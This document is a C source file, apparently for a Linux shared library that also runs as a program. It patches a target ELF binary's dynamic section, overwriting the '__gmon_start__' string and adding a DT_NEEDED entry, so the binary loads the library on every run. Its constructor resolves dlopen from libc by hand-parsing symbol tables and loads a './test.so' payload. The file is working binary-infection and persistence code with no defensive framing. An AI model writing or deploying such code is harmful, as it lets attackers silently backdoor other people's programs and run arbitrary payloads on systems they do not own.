#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <elf.h>
#include <stdint.h>
#include <errno.h>

#define lib "./test.so"

const char interp[] __attribute__((section(".interp"))) = "/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2"; //INTERP;

void entry(){
  // this is a cheap hack to get argc and argv off the stack since stdcall attribute is always ignored
  volatile uint64_t tmp; 
  int argc = *((char*)&tmp+0x60); // must be edited any time a locally scoped variable is added that adjusts stack locations
  char** argv = (char**)((char*)&tmp+0x68);

  int len = strlen(&argv[0][2]);
  
  if(argc == 2){
    int fd = open(argv[1], O_RDWR);
    void* base = mmap(NULL, 0x300000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); // file backed shared memory mapping so changes reflect in file

    Elf64_Ehdr* ehdr = (Elf64_Ehdr*)base;
    unsigned int elf_size = ehdr->e_shoff + (ehdr->e_shentsize * ehdr->e_shnum);
    
    Elf64_Shdr* shdr = (Elf64_Shdr*)(base + ehdr->e_shoff);

    Elf64_Shdr* shstrtab = (Elf64_Shdr*)(((ehdr->e_shstrndx * ehdr->e_shentsize) + ehdr->e_shoff) + base);

    char* dyn_str = NULL;

    char* strtab = (char*)(base + shstrtab->sh_offset);

    unsigned int dynstr_size = 0;

    Elf64_Dyn* dynamic = NULL;
    unsigned int dyn_cnt = 0;

    int flag = 0;
    
    // find needed sections
    for(int i = 0; i < ehdr->e_shnum && (dyn_str == NULL || dynamic == NULL); ++i){
      if(shdr->sh_type == SHT_STRTAB && !strcmp(&strtab[shdr->sh_name], ".dynstr")){
	dyn_str = (char*)ehdr + shdr->sh_offset;
	dynstr_size = shdr->sh_size;
	if(shdr[1].sh_offset - shdr->sh_offset >= sizeof(Elf64_Dyn)){
	  flag = 1;
	}
      }else if(shdr->sh_type == SHT_DYNAMIC && !strcmp(&strtab[shdr->sh_name], ".dynamic")){
	dynamic = (Elf64_Dyn*)((char*)ehdr + shdr->sh_offset);
	dyn_cnt = shdr->sh_size / sizeof(Elf64_Dyn);
      }
      shdr++;
    }

    // replace __gmon_start__ with SO name
    char* str = dyn_str + 1;
    while(1){
      if(!strcmp(str, "__gmon_start__")){
	strcpy(str, &argv[0][2]);
	break;
      }
      str += strlen(str) + 1;
    }

    if(flag){
      // for shifting Dyn array down 1 to add new dt_needed field at the top instead of dt_debug->dt_needed
      memmove(dynamic + 1, dynamic, dyn_cnt * sizeof(Elf64_Dyn));
      dynamic->d_tag = DT_NEEDED;
      dynamic->d_un.d_val = str - dyn_str;
    }else{
      // loop through Dyn struct array to find dt_debug field
      for(int i = 0; i < dyn_cnt; ++i){
	if(dynamic->d_tag == DT_DEBUG){
	  dynamic->d_tag = DT_NEEDED;
	  dynamic->d_un.d_val = str - dyn_str;
	  break;
	}
	dynamic++;
      }
    }
    
    msync(base, 0x300000, MS_SYNC);
    munmap(base, 0x300000);
    
    close(fd);
  }
  _exit(0);
}

void __attribute__((constructor)) foo(void){
  void* (*dl_open)(char*, int) = NULL;

  int pid = getpid();

  char maps[64] = { 0 };
  sprintf(maps, "/proc/%d/maps", pid);

  FILE* file = fopen(maps, "r");
  
  char* line = NULL;
  size_t len = 0;

  unsigned long long libc_base = 0;

  int fd = 0;

  // read pid proc maps to get libc base addr and full abs path
  while(1){
    getline(&line, &len, file);
    if(strstr(line, "libc") != NULL){
      int offset = strcspn(line, "-");
      line[offset++] = '\0';
      libc_base = strtoull(line, NULL, 16);
      line[strcspn(&line[offset], "\n") + offset] = '\0';
      fd = open(strstr(&line[offset], "/"), O_RDONLY);
      break;
    }
  }

  fclose(file);
  
  void* libc = mmap(NULL, 0x300000, PROT_READ, MAP_PRIVATE, fd, 0);

  close(fd);
  
  Elf64_Ehdr* ehdr = (Elf64_Ehdr*)libc;

  Elf64_Shdr* shdr = (Elf64_Shdr*)(libc + ehdr->e_shoff);

  Elf64_Shdr* shstrtab = (Elf64_Shdr*)(((ehdr->e_shstrndx * ehdr->e_shentsize) + ehdr->e_shoff) + libc);
  
  Elf64_Sym* dyn_sym = NULL;
  
  int sym_cnt = 0;

  char* dyn_str = NULL;

  char* strtab = (char*)(libc + shstrtab->sh_offset);

  uint32_t* hashtab = NULL;

  // collect all sections needed for resolution of dynamic symbol locations in libc
  for(int i = 0; i < ehdr->e_shnum && (dyn_sym == NULL || dyn_str == NULL || hashtab == NULL); ++i){
    if(shdr->sh_type == SHT_DYNSYM && !strcmp(&strtab[shdr->sh_name], ".dynsym")){
      dyn_sym = (Elf64_Sym*)((char*)ehdr + shdr->sh_offset);
      sym_cnt = shdr->sh_size / sizeof(Elf64_Sym);
    }else if(shdr->sh_type == SHT_STRTAB && !strcmp(&strtab[shdr->sh_name], ".dynstr")){
      dyn_str = (char*)ehdr + shdr->sh_offset;
    }else if(shdr->sh_type == SHT_HASH && !strcmp(&strtab[shdr->sh_name], ".hash")){
      hashtab = (uint32_t*)((char*)ehdr + shdr->sh_offset);
    }
    shdr++;
  }

  // if hash table found (should always??) then look up symbols via hash table
  if(hashtab != NULL){
    char* sym_name = "dlopen";
    uint32_t hash = 0, tmp;

    // hash the symbol name
    for(int i = 0; sym_name[i]; ++i){
      hash = (hash << 4) + sym_name[i];
      if((tmp = hash & 0xf0000000)){
	hash ^= tmp | (tmp >> 24);
      }
    }

    uint32_t nbucket = hashtab[0];
    uint32_t* bucket = &hashtab[2];
    uint32_t* chain = &bucket[nbucket];

    //traverse the bucket chains to find symbol
    for(uint32_t i = bucket[hash % nbucket]; i; i = chain[i]){
      if(!strcmp(&dyn_str[dyn_sym[i].st_name], sym_name)){
	dl_open = (void* (*)(char*, int))(dyn_sym[i].st_value + libc_base);
	break;
      }
    }

  }

  // as fall back allow linear symbol search
  if(dl_open == NULL){
    for(int i = 0; i < sym_cnt; ++i){
      if(dyn_sym->st_name != 0 && !strcmp(&dyn_str[dyn_sym->st_name], "dlopen")){
	dl_open = (void* (*)(char*, int))(dyn_sym->st_value + libc_base);
	break;
      }
      dyn_sym++;
    }
  }
  
  munmap(libc, 0x300000);
  
  // finally the fruits of labor, call the function
  dl_open(lib, RTLD_LAZY);
}
